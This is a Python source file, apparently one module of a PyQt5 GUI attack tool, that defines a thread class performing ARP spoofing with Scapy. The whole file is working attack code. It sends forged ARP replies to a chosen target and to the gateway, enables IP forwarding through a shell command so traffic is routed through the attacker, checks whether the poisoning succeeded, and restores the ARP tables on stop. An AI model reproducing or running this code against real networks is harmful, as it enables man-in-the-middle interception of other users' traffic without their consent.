import os
from PyQt5.QtCore     import QThread, pyqtSignal
from scapy.all        import Ether, ARP, sendp, getmacbyip, get_if_hwaddr, conf

class ARPSpoofThread(QThread):
    finished = pyqtSignal()

    def __init__(self, target_ip, gateway_ip, interval=2, parent=None):
        super().__init__(parent)
        self.target_ip  = target_ip
        self.gateway_ip = gateway_ip
        self.interval   = interval
        self.running    = True

    def restore_arp(self, iface, tmac, gmac):
        sendp(Ether(dst=tmac)/ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwsrc=gmac),
              iface=iface, verbose=False)
        sendp(Ether(dst=gmac)/ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwsrc=tmac),
              iface=iface, verbose=False)

    def run(self):
        iface       = conf.iface
        our_mac     = get_if_hwaddr(iface)
        tmac        = getmacbyip(self.target_ip)
        gmac        = getmacbyip(self.gateway_ip)

        if os.geteuid() != 0:
            raise PermissionError("Debes ejecutar como root")
        if not tmac or not gmac:
            print("[!] No se pudieron obtener las MACs. Abortando.")
            return
        if os.name != 'nt':
            os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

        pt  = Ether(dst=tmac)/ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwsrc=our_mac)
        pg  = Ether(dst=gmac)/ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwsrc=our_mac)

        while self.running:
            sendp(pt, iface=iface, verbose=False)
            sendp(pg, iface=iface, verbose=False)
            self.msleep(self.interval * 1000)

        self.restore_arp(iface, tmac, gmac)
        self.finished.emit()

    def stop(self):
        self.running = False

    def check_success(self, gateway_ip):
        # reutiliza la lógica que ya tienes en ARPSpoofTab
        from scapy.all import srp
        from ipaddress    import IPv4Address

        iface = conf.iface
        our_mac = get_if_hwaddr(iface).lower()
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gateway_ip)
        ans, _ = srp(pkt, timeout=2, retry=1, iface=iface, verbose=False)
        # devuelvo True si mi MAC aparece entre las respuestas
        return any(r.hwsrc.lower() == our_mac for _, r in ans)
